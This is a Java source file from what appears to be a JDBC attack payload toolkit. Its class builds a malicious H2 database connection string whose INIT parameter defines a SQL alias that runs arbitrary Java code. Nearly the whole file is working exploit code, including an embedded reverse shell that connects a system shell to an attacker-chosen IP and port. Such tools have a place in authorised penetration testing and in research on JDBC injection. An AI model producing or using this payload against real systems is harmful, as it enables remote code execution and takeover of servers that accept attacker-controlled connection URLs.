package cn.butler.jdbcattack.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.thirdparty.payloads.custom.CommandConstant;
import cn.butler.thirdparty.payloads.custom.CommandlUtil;
import cn.butler.payloads.PayloadRunner;
import cn.butler.utils.StringUtils;

public class H2CreateAlias implements ObjectPayload<Object> {

    @Override
    public Object getObject(String command) throws Exception {
        //这里必须大写作为方法名，否则有的h2版本会报错
        String randStr = StringUtils.getRandUppercaseStr(6);
        String cmd = null;

        // bypassmodule_classloader_defineclass的情况单独处理,因为需要将类放在ClassLoader所在模块下面
        if(command.startsWith(CommandConstant.COMMAND_BYPASSMODULE_CLASSLOADER_DEFINECLASS)){
            command = CommandConstant.COMMAND_BYPASSMODULE_CLASSLOADER_DEFINECLASS + randStr + "|" + command.substring(CommandConstant.COMMAND_BYPASSMODULE_CLASSLOADER_DEFINECLASS.length());
        }

        //ReverseShell的情况单独处理,因为Javassist的缘故new ProcessBuilder(shell)无法生成,所以没放在CommandUtils中
        if (command.startsWith(CommandConstant.COMMAND_REVERSESHELL)){
            String ipAndPort = command.substring(CommandConstant.COMMAND_REVERSESHELL.length());
            String[] parts = ipAndPort.split(":");
            String ip = parts[0];
            Integer port = Integer.valueOf(parts[1]);
            cmd = String.format("String shell = System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? \"cmd\" : \"sh\";" +
                "Process p = new ProcessBuilder(shell).redirectErrorStream(true).start();" +
                "Socket s = new Socket(\"%s\", %d);" +
                "InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();" +
                "OutputStream po = p.getOutputStream(), so = s.getOutputStream();" +
                "while (!s.isClosed()) {" +
                "    while (pi.available() > 0)" +
                "        so.write(pi.read());" +
                "    while (pe.available() > 0)" +
                "        so.write(pe.read());" +
                "    while (si.available() > 0)" +
                "        po.write(si.read());" +
                "    so.flush();" +
                "    po.flush();" +
                "    Thread.sleep(50);" +
                "    try {" +
                "        p.exitValue();" +
                "        break;" +
                "    } catch (Exception e) { }" +
                "}" +
                "p.destroy();" +
                "s.close();",ip,port);
//            new Socket(parts[0],port);
        }else {
            cmd = CommandlUtil.getCmd(command);
        }
        String INITParameter = String.format("DROP alias if EXISTS %s;CREATE ALIAS %s AS $$void %s() throws Exception {%s}$$;SELECT %s();",randStr,randStr,randStr,cmd,randStr);
        //转义分号: 因为在H2的连接串中分号是SQL语句分隔符,所以INIT配置参数中所有的分号都要设置转义
        INITParameter = INITParameter.replace(";", "\\;"); // 替换反斜杠
        String createAliasTemplate = "jdbc:h2:mem:test;MODE=MSSQLServer;INIT=" + INITParameter;
        return createAliasTemplate;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(H2CreateAlias.class, args);
    }
}
